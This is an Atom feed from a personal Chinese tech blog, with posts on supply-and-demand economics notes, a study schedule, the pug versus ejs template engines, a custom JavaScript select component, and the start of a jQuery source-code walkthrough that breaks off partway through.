<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ajun</title>
  <subtitle>听说悟净已经植发治好了秃头，有了论及婚嫁的女友。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jasonyan2015.github.io/"/>
  <updated>2017-05-06T02:17:33.386Z</updated>
  <id>https://jasonyan2015.github.io/</id>
  
  <author>
    <name>Ajun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第二讲——市场</title>
    <link href="https://jasonyan2015.github.io/2017/05/06/%E7%AC%AC%E4%BA%8C%E8%AE%B2%E2%80%94%E2%80%94%E5%B8%82%E5%9C%BA/"/>
    <id>https://jasonyan2015.github.io/2017/05/06/第二讲——市场/</id>
    <published>2017-05-06T02:16:21.367Z</published>
    <updated>2017-05-06T02:17:33.386Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>后天考选修，贴个[哭]</p>
</blockquote>
<a id="more"></a>
<h1 id="第三章-供给与需求的市场力量"><a href="#第三章-供给与需求的市场力量" class="headerlink" title="第三章 供给与需求的市场力量"></a>第三章 供给与需求的市场力量</h1><h2 id="市场和竞争"><a href="#市场和竞争" class="headerlink" title="市场和竞争"></a>市场和竞争</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>市场是由某种物品或劳务的买者或卖者组成的一个群体</p>
<blockquote>
<p>买者决定需求<br>卖者决定供给</p>
</blockquote>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
<li>有组织的（如农贸市场）</li>
<li>无组织的（如一个镇上的冰激凌市场）</li>
<li>完全竞争市场<ul>
<li>每个买者卖者对市场价格影响微乎其微（买卖双方均是价格接受者）</li>
<li>可供销售的物品或劳务完全相同（同质商品）</li>
</ul>
</li>
<li>完全垄断市场<ul>
<li>市场只有一个卖者（垄断的初始定义），并由其决定价格（卖者是价格制定者）</li>
</ul>
</li>
<li>（分割）现实中以上两者都比较少，一半市场结构居于这两种之间</li>
<li>垄断竞争市场</li>
<li>寡头垄断市场</li>
</ul>
<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>一种物品的需求量，是买者<em>愿意</em>并且<em>能够购买</em>的这种物品的数量。</p>
<h3 id="需求定理"><a href="#需求定理" class="headerlink" title="需求定理"></a>需求定理</h3><p>在其他条件不变时，一种物品的价格上升，对该物品的需求量减少；一种物品的价格下降，对该物品的需求量增加。换言之，在其他条件不变时，物品价格与需求量之间呈负相关关系</p>
<h3 id="需求表"><a href="#需求表" class="headerlink" title="需求表"></a>需求表</h3><p>在其他影响消费者需求的因素不变的情况下，一种物品的价格与其需求量之间关系的表格。</p>
<table>
<thead>
<tr>
<th style="text-align:center">咖啡价格</th>
<th style="text-align:center">需求量</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">￥0.00</td>
<td style="text-align:center">16</td>
</tr>
<tr>
<td style="text-align:center">￥1.00</td>
<td style="text-align:center">14</td>
</tr>
<tr>
<td style="text-align:center">￥2.00</td>
<td style="text-align:center">12</td>
</tr>
<tr>
<td style="text-align:center">￥3.00</td>
<td style="text-align:center">10</td>
</tr>
<tr>
<td style="text-align:center">￥4.00</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">￥5.00</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">￥6.00</td>
<td style="text-align:center">4</td>
</tr>
</tbody>
</table>
<h3 id="需求曲线"><a href="#需求曲线" class="headerlink" title="需求曲线"></a>需求曲线</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>由需求表的价格为y轴，市场需求量为x轴画的曲线</p>
<blockquote>
<p>市场需求量是所有买者在每一价格水平下需求量的总和</p>
</blockquote>
<h4 id="曲线的移动"><a href="#曲线的移动" class="headerlink" title="曲线的移动"></a>曲线的移动</h4><ul>
<li>需求增加：使每一价格水平下的需求量增加的任何变动都会使需求曲线向右移动</li>
<li>需求减少：使每一价格水平下的需求量减少的任何变动都会使需求曲线向左移动</li>
</ul>
<blockquote>
<p>区分于</p>
<ul>
<li>需求量增加/减少</li>
<li>价格增加/减少</li>
</ul>
</blockquote>
<ul>
<li>买者数量增加：曲线右移</li>
<li>收入<ul>
<li>正常物品：需求量与收入呈正比</li>
<li>低档物品：需求量与收入呈反比</li>
</ul>
</li>
<li>相关物品的价格<ul>
<li>替代品：一种物品价格上升引起另一种物品需求量增加</li>
<li>互补品：一种物品价格上升引起另一种物品需求量减少</li>
</ul>
</li>
<li>嗜好</li>
<li>预期</li>
</ul>
<h2 id="供给"><a href="#供给" class="headerlink" title="供给"></a>供给</h2><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>一种物品的供给量，是卖者<em>愿意</em>并且<em>能够出售</em>的一种物品的数量。</p>
<h3 id="供给定理"><a href="#供给定理" class="headerlink" title="供给定理"></a>供给定理</h3><p>在其他条件不变时，一种物品价格上升，该物品供给量增加；一种物品价格下降，该物品供给量减少。换言之，在其他条件不变时，物品价格与供给量之间呈正相关关系。</p>
<h3 id="供给表"><a href="#供给表" class="headerlink" title="供给表"></a>供给表</h3><p>在其他条件保持不变情况下，一种物品的价格与供给量之间关系的表格</p>
<table>
<thead>
<tr>
<th style="text-align:center">咖啡价格</th>
<th style="text-align:center">供给量</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">￥0.00</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">￥1.00</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">￥2.00</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">￥3.00</td>
<td style="text-align:center">9</td>
</tr>
<tr>
<td style="text-align:center">￥4.00</td>
<td style="text-align:center">12</td>
</tr>
<tr>
<td style="text-align:center">￥5.00</td>
<td style="text-align:center">15</td>
</tr>
<tr>
<td style="text-align:center">￥6.00</td>
<td style="text-align:center">18</td>
</tr>
</tbody>
</table>
<h3 id="供给曲线"><a href="#供给曲线" class="headerlink" title="供给曲线"></a>供给曲线</h3><p>…</p>
<blockquote>
<p>市场供给量：…</p>
</blockquote>
<h4 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h4><ul>
<li>供给增加：使每一价格水平的供给量都增加的任何一种变动，都会使供给曲线向右移动</li>
<li>供给减少：使每一价格水平的供给量都减少的任何一种变动，都会使供给曲线向左移动</li>
</ul>
<blockquote>
<p>区分于</p>
<ul>
<li>供给量增加/减少</li>
<li>价格增加/减少</li>
</ul>
</blockquote>
<ul>
<li>卖者数量增加：右移</li>
<li>投入品价格（成本）下降：右移</li>
<li>技术改进：右移</li>
<li>预期：（奇货可居）</li>
</ul>
<h2 id="需求与供给的结合"><a href="#需求与供给的结合" class="headerlink" title="需求与供给的结合"></a>需求与供给的结合</h2><p>需求曲线和供给曲线交点，价格与市场均衡</p>
<h4 id="均衡-："><a href="#均衡-：" class="headerlink" title="均衡 ："></a>均衡 ：</h4><p>各种力量处于平衡的状态</p>
<h4 id="市场均衡："><a href="#市场均衡：" class="headerlink" title="市场均衡："></a>市场均衡：</h4><p>商品的需求价格等于供给价格，商品的需求数量等于供给数量</p>
<h4 id="均衡价格（市场出清价格）："><a href="#均衡价格（市场出清价格）：" class="headerlink" title="均衡价格（市场出清价格）："></a>均衡价格（市场出清价格）：</h4><p>使供给与需求平衡的价格。</p>
<h4 id="均衡数量："><a href="#均衡数量：" class="headerlink" title="均衡数量："></a>均衡数量：</h4><p>均衡价格下的商品供给量和商品需求量。</p>
<h3 id="过剩（超额供给）"><a href="#过剩（超额供给）" class="headerlink" title="过剩（超额供给）"></a>过剩（超额供给）</h3><p>市场价格高于均衡价格</p>
<p>供给量大于需求量的状态（即供过于求的状态）</p>
<h3 id="短缺（超额需求）"><a href="#短缺（超额需求）" class="headerlink" title="短缺（超额需求）"></a>短缺（超额需求）</h3><p>市场价格低于均衡价格</p>
<p>需求量大于供给量的状态（即供不应求的状态）</p>
<h3 id="供求定理"><a href="#供求定理" class="headerlink" title="供求定理"></a>供求定理</h3><p>任何一种物品的价格调整都会使该物品的供给与需求达到平衡。</p>
<p>价格调整过程即为市场配置稀缺资源的过程。</p>
<h2 id="价格配置资源（小结）"><a href="#价格配置资源（小结）" class="headerlink" title="价格配置资源（小结）"></a>价格配置资源（小结）</h2><ul>
<li>价格是引导资源配置的信号</li>
<li>经济学家使用供给与需求模型来分析竞争市场</li>
<li><strong>向右下方倾斜的需求曲线</strong>反应了需求定理</li>
<li><strong>向右上方倾斜的供给曲线</strong>反应了供给定理</li>
<li>供给曲线与需求曲线相交决定了市场均衡</li>
<li>当市场价格高于均衡价格时，存在物品的过剩，引起市场价格下降。</li>
<li>当市场价格低于均衡价格时，存在物品的短缺，引起市场价格上升</li>
<li>在市场经济中，价格是引导经济决策，从而配置稀缺资源的信号。</li>
<li>微观经济学有时也称为<strong>价格理论</strong></li>
<li>为了分析某个事件如何影响一个市场，我们用供求图来考察该事件对均衡价格和均衡数量的影响。我们遵循三个步骤进行：<ol>
<li>确定该事件是使供给曲线移动，还是使需求曲线移动（还是使两者都移动）</li>
<li>确定曲线移动的方向</li>
<li>比较新均衡与原来的均衡</li>
</ol>
</li>
</ul>
<h1 id="第4章-供需弹性及其应用"><a href="#第4章-供需弹性及其应用" class="headerlink" title="第4章 供需弹性及其应用"></a>第4章 供需弹性及其应用</h1>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;后天考选修，贴个[哭]&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2017.5~2017.9计划表</title>
    <link href="https://jasonyan2015.github.io/2017/05/06/2017%E8%AE%A1%E5%88%92/"/>
    <id>https://jasonyan2015.github.io/2017/05/06/2017计划/</id>
    <published>2017-05-05T16:00:45.984Z</published>
    <updated>2017-05-06T01:06:03.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事项"><a href="#事项" class="headerlink" title="事项"></a>事项</h2><ul>
<li>【基础】红宝书（1周），犀牛书（9周）。你不知道的js系列（6周），奇舞团视频</li>
<li>【项目】网易云app项目</li>
<li>【笔试准备】笔试训练</li>
<li>【面试准备】vue、angular教程，jq源码，http、网络相关</li>
</ul>
<a id="more"></a>
<hr>
<h2 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h2><h4 id="6-Sat"><a href="#6-Sat" class="headerlink" title="6 Sat."></a>6 Sat.</h4><ul>
<li>7.30 起床，伯川占座</li>
<li>~ 复习经济学原理</li>
<li>10.00 出发10路过去罗斯福</li>
<li>~ 回伯川复习 or 红宝书</li>
<li>赛码周练</li>
</ul>
<h4 id="7-Sun"><a href="#7-Sun" class="headerlink" title="7 Sun."></a>7 Sun.</h4><ul>
<li>经济学原理复习</li>
</ul>
<h4 id="8-Mon"><a href="#8-Mon" class="headerlink" title="8 Mon."></a><strong>8</strong> Mon.</h4><ul>
<li>经济学原理考试</li>
<li>跑步</li>
</ul>
<h4 id="10-Wed"><a href="#10-Wed" class="headerlink" title="10 Wed."></a>10 Wed.</h4><ul>
<li><strong>截止</strong> 解决 项目中node后端页面跳转问题</li>
</ul>
<h4 id="30"><a href="#30" class="headerlink" title="30"></a><strong>30</strong></h4><ul>
<li>开始投简历</li>
</ul>
<h2 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h2><h4 id="2"><a href="#2" class="headerlink" title="2"></a><strong>2</strong></h4><ul>
<li>腾讯大连离职</li>
</ul>
<h4 id="8"><a href="#8" class="headerlink" title="8"></a><strong>8</strong></h4><ul>
<li>过控工程考试</li>
</ul>
<h4 id="21"><a href="#21" class="headerlink" title="21"></a><strong>2</strong>1</h4><ul>
<li>过控仪表考试</li>
</ul>
<h4 id="23"><a href="#23" class="headerlink" title="23"></a><strong>23</strong></h4><ul>
<li>计算机控制技术考试</li>
</ul>
<h2 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h2><h1 id="校招开始"><a href="#校招开始" class="headerlink" title="校招开始"></a>校招开始</h1>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;事项&quot;&gt;&lt;a href=&quot;#事项&quot; class=&quot;headerlink&quot; title=&quot;事项&quot;&gt;&lt;/a&gt;事项&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;【基础】红宝书（1周），犀牛书（9周）。你不知道的js系列（6周），奇舞团视频&lt;/li&gt;
&lt;li&gt;【项目】网易云app项目&lt;/li&gt;
&lt;li&gt;【笔试准备】笔试训练&lt;/li&gt;
&lt;li&gt;【面试准备】vue、angular教程，jq源码，http、网络相关&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>node模板引擎——pug(jade)</title>
    <link href="https://jasonyan2015.github.io/2017/05/01/node%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E--pug/"/>
    <id>https://jasonyan2015.github.io/2017/05/01/node模板引擎--pug/</id>
    <published>2017-05-01T02:42:35.548Z</published>
    <updated>2017-05-01T03:13:49.800Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>最近发掘了一个个人项目，初上手Node构建web应用。之前大概学了学好久了也都忘了，这次趁着这个项目好好熟悉熟悉，练练手。首先从模板引擎开始吧。</p>
</blockquote>
<a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>jade</code>和<code>pug</code>是一个东西，以前叫<code>jade</code>后来因为商标问题改名<code>pug</code>。</p>
<h2 id="和ejs比较"><a href="#和ejs比较" class="headerlink" title="和ejs比较"></a>和ejs比较</h2><p>网上有流传过一个万行测试(当时还叫Jade)，让两者和另一个模板引擎，<code>Handlebars</code>解释万行html代码，最后的效率（花费时间）是</p>
<p>Jade 287ms &gt; ejs 43ms &gt; Handlebars 28ms</p>
<blockquote>
<p>Jade 因为采用了类似 zen coding 的语法，比较新奇，但效率极其低下。</p>
</blockquote>
<p>但是，<code>pug</code>就其强制缩进而优雅简洁。<code>ejs</code>更传统，于是在大量数据代码结构下页面的结构容易显得混乱。</p>
<p>另外看了知乎贺老的回答，发觉<code>pug</code>一个超棒的点</p>
<blockquote>
<p>换行处理，避免产生额外的空白节点</p>
</blockquote>
<p>不知道大家怎么想，反正我老是因为莫名其妙的空白节点困扰，尤其是css样式的时候，其实也知道怎么解决，比如根节点<code>font-size: 0</code>之类的，但是主要是容易和其他样式造成的莫名空隙搞混，不知道到底是哪个原因，就会多一步确认和调试步骤</p>
<p>贺老还讲了很多，具体看文末的参考链接。</p>
<p>但是我觉得吧，因为<code>pug</code>的简洁语法，导致会有点上手难度，不像ejs，简直就是个<code>jsp</code>，一眼就看懂了，但是<code>pug</code>要是没专门学习过还真看不太懂，更别说自己写了。</p>
<h2 id="jade语法"><a href="#jade语法" class="headerlink" title="jade语法"></a>jade语法</h2><p><strong>缩进</strong>，<strong>缩进</strong>，<strong>再缩进</strong></p>
<blockquote>
<p>就笼统地总结一下吧,详细可以看一下参考链接。</p>
</blockquote>
<ol>
<li>不用尖括号，使用 <strong>缩进</strong></li>
<li>每个换行的第一个单词会被解释为一个标签(无论HTML有没有这个标签)</li>
<li>标签的属性名使用括号包起来，并且属性之间用逗号间隔<code>(ATTRNAME1=ATTRVALUE1, ATTRNAME2=ATTRVALUE2)</code>。特别的，<code>id</code>和<code>class</code>可以用像<code>emmet</code>的语法: <code>TAGNAME#IDNAME.CLASSNAME</code>，然后再跟括号包裹其他属性</li>
<li>使用<code>!{}</code> <code>#{}</code> <code>=</code> <code>!=</code>来渲染后台数据，其中，用<code>!</code>的这一系列可以解释后天数据中的尖括号标签，而其他会把尖括号当成字符串渲染，感觉也是安全考虑</li>
<li>服务端代码用<code>-</code>开头，比如<code>if</code>判断和<code>for</code>循环等</li>
<li>可以重用<code>jade</code>块(<code>Mixin</code>声明一个块，然后用<code>+BLOCKNAME()</code>调用)</li>
<li>模板继承，<code>extends DIRNAME</code></li>
</ol>
<hr>
<p>参考链接</p>
<ul>
<li><a href="http://cnodejs.org/topic/50e70edfa7e6c6171a1d70fa" target="_blank" rel="external">Web 模板 Jade、EJS、Handlebars 万行代码解释效率比较，Jade 完败</a></li>
<li><a href="https://www.zhihu.com/question/20355486?sort=created" target="_blank" rel="external">【知乎】关于nodejs的模板引擎，如何选择 EJS 和 Jade?</a></li>
<li><a href="http://cnodejs.org/topic/5368adc5cf738dd6090060f2" target="_blank" rel="external"> Jade 模板引擎使用</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近发掘了一个个人项目，初上手Node构建web应用。之前大概学了学好久了也都忘了，这次趁着这个项目好好熟悉熟悉，练练手。首先从模板引擎开始吧。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="html" scheme="https://jasonyan2015.github.io/tags/html/"/>
    
      <category term="node" scheme="https://jasonyan2015.github.io/tags/node/"/>
    
      <category term="pug" scheme="https://jasonyan2015.github.io/tags/pug/"/>
    
      <category term="模板引擎" scheme="https://jasonyan2015.github.io/tags/%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>第一次面向对象，把对象Po出来吧</title>
    <link href="https://jasonyan2015.github.io/2017/04/22/%E6%A8%A1%E6%8B%9Fselect/"/>
    <id>https://jasonyan2015.github.io/2017/04/22/模拟select/</id>
    <published>2017-04-22T08:33:38.801Z</published>
    <updated>2017-04-22T08:33:10.199Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>面对select这种如此常见的需求，怎么能不写个通用组件呢</p>
</blockquote>
<a id="more"></a>
<p>直接po源码，第一次面向对象，如有任何建议、意见，不胜感激！</p>
<pre><code>function Select(options) {
    this.DOMobj = document.querySelector(options.srcNode);
    this.DOMselect = document.createElement(&apos;div&apos;);
    this.DOMoptContainer = document.createElement(&apos;ul&apos;);
    this.DOMoptions = {};

    this.prototype = {
        //默认样式
        defaultStyle : {
            &apos;select&apos;: {
                &apos;position&apos;: &apos;relative&apos;,
                &apos;display&apos;: &apos;inline-block&apos;,
                &apos;width&apos;: &apos;200px&apos;,
                &apos;height&apos;: &apos;32px&apos;,
                &apos;line-height&apos;: &apos;32px&apos;,
                &apos;background-color&apos;: &apos;#fff&apos;,
                &apos;text-align&apos;: &apos;center&apos;,
                &apos;box-shadow&apos;: &apos;0 0 1px #333&apos;,
                &apos;cursor&apos;: &apos;pointer&apos;
            },
            &apos;optContainer&apos;: {
                &apos;margin&apos;: &apos;0&apos;,
                &apos;padding&apos;: &apos;0&apos;,
                &apos;display&apos;: &apos;none&apos;,
                &apos;list-style&apos;: &apos;none&apos;,
                &apos;position&apos;: &apos;absolute&apos;,
                &apos;z-index&apos;: &apos;9999&apos;,
                &apos;width&apos;: &apos;200px&apos;,
                &apos;background-color&apos;: &apos;#eee&apos;,
                &apos;text-align&apos;: &apos;center&apos;,
                &apos;box-shadow&apos;: &apos;0 0 1px #333&apos;
            },
            &apos;option&apos;: {
                &apos;margin&apos;: &apos;0&apos;,
                &apos;padding&apos;: &apos;0&apos;,
                &apos;display&apos;: &apos;inline-block&apos;,
                &apos;list-style&apos;: &apos;none&apos;,
                &apos;width&apos;: &apos;200px&apos;,
                &apos;height&apos;: &apos;32px&apos;,
                &apos;line-height&apos;: &apos;32px&apos;,
                &apos;background-color&apos;: &apos;#eee&apos;,
                &apos;color&apos;: &apos;#369&apos;,
                &apos;text-align&apos;: &apos;center&apos;,
                &apos;cursor&apos;: &apos;pointer&apos;
            },
            &apos;option:hover&apos;: {
                &apos;background-color&apos;: &apos;#2477fb&apos;,
                &apos;color&apos;: &apos;#fff&apos;
            }
        },
        //给下拉框添加上各选项，同时也作为选择内容框的点击事件
        setOptions: (function() {
            var flag = this.DOMselect.getAttribute(&apos;data-isOptionShown&apos;) === &apos;true&apos; ? true : false;
            if(!this.DOMselect.getAttribute(&apos;data-isOptionShown&apos;)) {
                this.DOMoptContainer.innerHTML = &apos;&apos;;
                var elemLi = [];

                for (var p in options.data) {
                    if (options.data.hasOwnProperty(p)) {
                        elemLi[p] = document.createElement(&apos;li&apos;);
                        elemLi[p].setAttribute(&apos;data-value&apos;, p);
                        elemLi[p].setAttribute(&apos;data-content&apos;, options.data[p]);
                        elemLi[p].innerHTML = options.data[p];
                        this.DOMoptContainer.appendChild(elemLi[p]);
                        elemLi[p].addEventListener(&apos;click&apos;, this.prototype.handleSelect);
                    }
                }

                this.DOMoptions = this.DOMoptContainer.getElementsByTagName(&apos;li&apos;);
                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);
                this.DOMoptContainer.style.display = &apos;block&apos;;
            } else if(!flag) {
                this.DOMoptContainer.style.display = &apos;block&apos;;
                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, true);
            } else if(flag) {
                this.DOMoptContainer.style.display = &apos;none&apos;;
                this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);
            }
        }).bind(this),
        //每个选项的点击事件
        handleSelect: (function(e) {
            var ev = e || window.event;
            var target = ev.target || ev.srcElement;

            this.DOMselect.innerHTML = target.innerHTML;
            this.DOMselect.setAttribute(&apos;data-value&apos;, target.getAttribute(&apos;data-value&apos;));
            this.DOMselect.setAttribute(&apos;data-content&apos;, target.getAttribute(&apos;data-content&apos;));
            this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);

            this.DOMoptContainer.style.display = &apos;none&apos;;
            if (options.onChange) {
                options.onChange(this.DOMselect);
            }
        }).bind(this),
        //更新样式入口
        updateStyle: (function(str) {
            var o = {};
            if (str) {
                for (var index in str) {
                    o[index] = Object.assign({}, this.prototype.defaultStyle[index], str[index]);
                }
            }
            o = Object.assign({}, this.prototype.defaultStyle, o);
            this.prototype.setStyle(o);
        }).bind(this),
        //为组件内各个元素添加行内样式
        setStyle: (function(s) {
            for(var sKey in s) {
                if(s.hasOwnProperty(sKey)) {
                    var str = &apos;&apos;;
                    switch (sKey) {
                    case &apos;root&apos;: {
                        Object.assign(this.DOMobj.style, s[sKey]);
                        break;
                    }
                    case &apos;select&apos;: {
                        Object.assign(this.DOMselect.style, s[sKey]);
                        break;
                    }
                    case &apos;optContainer&apos;: {
                        Object.assign(this.DOMoptContainer.style, s[sKey]);
                        break;
                    }
                    case &apos;option&apos;: {
                        for (var i = 0; i &lt; this.DOMoptions.length; i++) {
                            Object.assign(this.DOMoptions[i].style, s[sKey]);
                        }
                        break;
                    }
                    case &apos;option:hover&apos;: {
                        var self = this;
                        for (var j = 0; j &lt; this.DOMoptions.length; j++) {
                            this.DOMoptions[j].onmouseover = function(event) {
                                var obj = Object.assign({}, self.prototype.defaultStyle.option, self.prototype.defaultStyle[&apos;option:hover&apos;], options.style ? Object.assign({}, options.style[&apos;option&apos;], options.style[&apos;option:hover&apos;]) : null);
                                Object.assign(event.target.style, obj);
                            };
                            this.DOMoptions[j].onmouseout = function(event) {
                                var obj = Object.assign({}, self.prototype.defaultStyle.option, options.style ? options.style.option : null);
                                Object.assign(event.target.style, obj);
                            };
                        }
                        break;
                    }
                    }
                }
            }
        }).bind(this),
        //鼠标离开选项区选项消失，mouseleave事件
        loseFocus: (function(event) {
            var ev = event || window.event;
            var target = ev.target || ev.srcElement;
            ev.stopPropagation();
            target.style.display = &apos;none&apos;;

            this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);
        }).bind(this)
    };

    //整个组件初始化
    this.init = function() {
        //清空并添加空元素div和ul
        this.DOMobj.innerHTML = &apos;&apos;;
        this.DOMobj.appendChild(this.DOMselect);
        this.DOMobj.appendChild(this.DOMoptContainer);

        //div作为选择内容框，添加点击事件
        var self = this;
        this.DOMselect.addEventListener(&apos;click&apos;, function(){self.prototype.setOptions(options.data);}, true);
        this.DOMoptContainer.addEventListener(&apos;mouseleave&apos;, self.prototype.loseFocus);
        //设置默认选中项
        this.DOMselect.setAttribute(&apos;data-value&apos;, options.chosen[0]);
        this.DOMselect.setAttribute(&apos;data-content&apos;, options.chosen[1]);
        this.DOMselect.innerHTML = options.chosen[1];

        this.prototype.setOptions(options.data);
        this.prototype.updateStyle(options.style);
    };

    this.init();
}
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;面对select这种如此常见的需求，怎么能不写个通用组件呢&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="模块化" scheme="https://jasonyan2015.github.io/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
      <category term="面向对象" scheme="https://jasonyan2015.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
  <entry>
    <title>jQuery源码剖析·第一弹</title>
    <link href="https://jasonyan2015.github.io/2017/04/22/jQuery%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E5%BC%B9/"/>
    <id>https://jasonyan2015.github.io/2017/04/22/jQuery源码分析第一弹/</id>
    <published>2017-04-22T08:24:45.697Z</published>
    <updated>2017-04-22T08:26:51.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>神库jQuery的内心世界</p>
<p>选用1.9.0版本jQuery</p>
</blockquote>
<a id="more"></a>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
<li><strong>沙箱封装</strong></li>
<li><strong>core工具方法</strong>：jquery的核心组成部分，包括<ul>
<li>$.trim()去除字符串两端的空格。（内部调用7次）</li>
<li>$.each()遍历数组或对象（内部调用59次）</li>
<li>$.inArray()返回一个值在数组中的索引位置。如果该值不在数组中，则返回-1。（内部调用9次）</li>
<li>$.grep()返回数组中符合某种标准的元素。（内部调用6次）</li>
<li>$.merge()合并两个数组。（内部调用11次）</li>
<li>$.map()将一个数组中的元素转换到另一个数组中。（内部调用12次）</li>
<li>$.makeArray()将对象转化为数组。（内部调用6次）</li>
<li>$.globalEval() 在全局作用域下执行一段js脚本。（内部调用2次）</li>
<li>$.proxy()接受一个函数，然后返回一个新函数，并且这个新函数始终保持了特定的上下文(context)语境。（内部调用0次）</li>
<li>$.nodeName()返回DOM节点的节点名字，或者判断DOM节点名是否为某某名字。（内部调用51次）</li>
<li>$.extend()将多个对象，合并到第一个对象。（内部调用42次）</li>
</ul>
</li>
<li><strong>$.type类型判断</strong>：判断对象的类别（函数对象、日期对象、数组对象、正则对象等等（内部调用65次）,并以调用此方法来实现：<ul>
<li>$.isArray()判断某个参数是否为数组。（内部调用12次）</li>
<li>$.isEmptyObject()判断某个对象是否为空（不含有任何属性）。（内部调用4次）</li>
<li>$.isFunction()判断某个参数是否为函数。（内部调用32次）</li>
<li>$.isPlainObject()判断某个参数是否为用”{}”或”new Object”建立的对象。（内部调用4次）</li>
<li>$.isWindow()判断是否为window对象。（内部调用6次）</li>
</ul>
</li>
<li><strong>处理ajax返回数据</strong>：主要包括<ul>
<li>$.parseHTML() 解析HTML（内部调用2次）</li>
<li>$.parseJSON() 解析JSON（内部调用2次）</li>
<li>$.parseXML() 解析XML（内部调用1次）</li>
</ul>
</li>
<li><strong>几个简单的函数</strong>：不在之后的文章中分析<ul>
<li>$.noop() 一个空函数，个人觉得是用来作为一个默认的回调函数，无需每次去定义一个空的function消耗资源。（内部调用2次）</li>
<li>$.now() 获取当前时间戳，代码很简单：return (new Date()).getTime();。（内部调用4次）</li>
<li>$.error() 报错，对外抛出一个异常，代码很简单：throw new Error(msg);。（内部调用2次）</li>
</ul>
</li>
</ol>
<h2 id="沙箱封装"><a href="#沙箱封装" class="headerlink" title="沙箱封装"></a>沙箱封装</h2><pre><code>(function( window, undefined ) {
     //用一个函数域把整个库包起来，就是所谓的沙箱
     //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局
     //把当前沙箱需要的外部变量通过函数参数引入进来
     //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数
    &quot;use strict&quot;;
    window.jQuery = window.$ = jQuery;
})( window );
</code></pre><p>至于为什么第二个参数<code>undefined</code>，这是一个针对压缩的小trick，同时也是为了防止因ES5之前能对<code>undefined</code>赋值而使用者编程不规范引发错误。</p>
<p>压缩前</p>
<pre><code>(function( window, undefined ) {
  var a = undefined;
  if (a == undefined){......}

  ......
  if (c == undefined) return;
})( window );
</code></pre><p>压缩后</p>
<pre><code>(function(w, u) {
  var a = u;
  if (a == u){......}

  ......
  if (c == u) return;
})(w);
</code></pre><p>内部全局的<code>undefined</code>被缩成一个<code>u</code>，缩小了整个库的压缩包的体积。</p>
<h2 id="core工具方法"><a href="#core工具方法" class="headerlink" title="core工具方法"></a>core工具方法</h2><h3 id="引用类型公有方法的存储"><a href="#引用类型公有方法的存储" class="headerlink" title="引用类型公有方法的存储"></a>引用类型公有方法的存储</h3><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code>class2type = {},
core_deletedIds = [],
core_version = &quot;1.9.0&quot;,

// Save a reference to some core methods
core_concat = core_deletedIds.concat,
core_push = core_deletedIds.push,
core_slice = core_deletedIds.slice,
core_indexOf = core_deletedIds.indexOf,
core_toString = class2type.toString,
core_hasOwn = class2type.hasOwnProperty,
core_trim = core_version.trim,
</code></pre><h4 id="等同于："><a href="#等同于：" class="headerlink" title="等同于："></a>等同于：</h4><pre><code>core_concat = Array.prototype.concat, 
......
</code></pre><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>这里把js的几个引用类型的原生方法存储下来。本身这些方法的调用方式就有这3种：</p>
